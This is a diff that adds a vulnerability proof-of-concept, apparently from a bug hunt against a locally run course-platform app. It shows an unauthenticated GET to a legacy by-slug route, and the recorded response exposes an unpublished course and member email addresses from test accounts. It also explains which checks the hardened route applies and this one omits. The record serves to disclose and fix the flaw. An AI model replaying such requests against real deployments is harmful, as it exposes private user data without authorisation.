@@ -1,0 +1,23 @@
+### VULN-016 — Unauthenticated GET /course/slug/:slug leaks a private course + member emails
+### Precondition (admin): an UNPUBLISHED, non-PUBLIC (SELF_PACED, status=ACTIVE) course with a slug and a member.
+### The decisive request carries NO Cookie header — it is fully unauthenticated.
+
+GET http://localhost:21527/course/slug/cvehunt-016-slug_cde57017 HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+
+### Response: HTTP 200
+### {
+###   "success": true,
+###   "data": {
+###     "isPublished": false, "type": "SELF_PACED", "status": "ACTIVE",
+###     "group": { "members": [
+###         { "profile": { "email": "admin@cvehunt.local", ... } },
+###         { "profile": { "email": "u_ce6534a6@cvehunt.local", ... } }   <-- member emails leaked
+###     ] },
+###     "content": { ... full private course structure ... }
+###   }
+### }
+###
+### The hardened public channel GET /org-site/course/:slug returns null unless
+### type='PUBLIC' && isPublished && status='ACTIVE'; this legacy by-slug route enforces none of that.
